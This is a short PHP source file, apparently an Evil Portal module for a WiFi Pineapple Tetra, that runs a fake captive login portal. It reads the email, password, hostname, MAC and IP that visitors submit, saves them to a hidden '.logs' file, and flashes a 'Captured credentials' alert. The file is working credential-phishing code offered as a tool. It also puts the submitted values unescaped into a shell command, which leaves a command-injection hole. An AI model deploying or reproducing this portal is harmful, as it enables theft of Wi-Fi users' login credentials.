<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        if (isset($_POST['email'])) {
            $email = $_POST['email'];
            $pwd = $_POST['password'];
            $hostname = $_POST['hostname'];
            $mac = $_POST['mac'];
            $ip = $_POST['ip'];

            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());
            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);

            // Notify WiFi Pineapple Tetra's notification bar
            $this->execBackground("notify 'Captured credentials - Email: $email, Password: $pwd'");
        }

        // Call parent to handle basic authorization
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
